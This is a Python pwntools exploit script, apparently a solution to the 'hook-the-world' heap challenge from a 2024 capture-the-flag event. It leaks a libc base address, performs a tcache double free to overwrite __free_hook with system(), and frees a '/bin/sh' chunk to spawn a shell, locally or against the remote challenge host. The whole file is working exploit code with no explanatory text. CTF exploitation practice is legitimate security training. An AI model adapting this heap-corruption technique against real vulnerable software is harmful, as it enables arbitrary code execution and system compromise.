from pwn import *

def get_chest(r, idx, sizechst):
    # Choice
    r.recvuntil('>')
    r.sendline(b'1')

    # chest's number
    r.recvuntil('number:')
    r.sendline(idx)

    # chest's size
    r.recvuntil('size:')
    r.sendline(sizechst)

def lazy_people(r, idx):
    # Choice
    r.recvuntil('>')
    r.sendline(b'2')

    # idiot's number
    r.recvuntil(':')
    r.sendline(idx)

def fill_chest(r, idx, payload):
    # Choice
    r.recvuntil('>')
    r.sendline(b'3')

    # chest's number
    r.recvuntil('>')
    r.sendline(idx)

    # Message
    r.sendline(payload)

def review_profit(r, idx):
    # Choice
    r.recvuntil('>')
    r.sendline(b'4')

    # chest's number
    r.recvuntil(':')
    r.sendline(idx)

def exploit(checkRemote):
    if(checkRemote is True):
        r = remote('hook-the-world.chals.nitectf2024.live', 1337, ssl=True)
    else:
        context.binary = ELF('./chall_patched', checksec=False)
        r = process()
    
    for i in range(0, 9):
        get_chest(r, str(i), b'145')
        print('Loop :', i)
    
    for i in range(0, 9):
        lazy_people(r, str(i))
    
    # Get libc address
    get_chest(r, b'9', b'20')
    review_profit(r, b'9')
    libcbase_addr = u64(r.recv(8)) - 0x3ebca0
    free_hook_addr = libcbase_addr + 0x3eaef0 + 0x29f8
    system_addr = libcbase_addr + 0x4f420
    free_addr = libcbase_addr + 0x97910
    log.info(f'Address of libc base is: {hex(libcbase_addr)}')
    log.info(f'Address of __free_hook() is: {hex(free_hook_addr)}')
    log.info(f'Address of system() is: {hex(system_addr)}')
    log.info(f'Address of free() is: {hex(free_addr)}')

    # Double Free
    get_chest(r, b'10', b'64')
    lazy_people(r, b'10')
    fill_chest(r, b'10', b'B'*8)
    lazy_people(r, b'10')

    # Overwrite __free_hook() with system()
    fill_chest(r, b'10', p64(free_hook_addr))
    get_chest(r, b'11', b'64')
    get_chest(r, b'12', b'64')
    fill_chest(r, b'12', p64(system_addr))
    get_chest(r, b'14', b'64')
    fill_chest(r, b'14', b'/bin/sh')
    lazy_people(r, b'14')
    r.interactive()

exploit(False)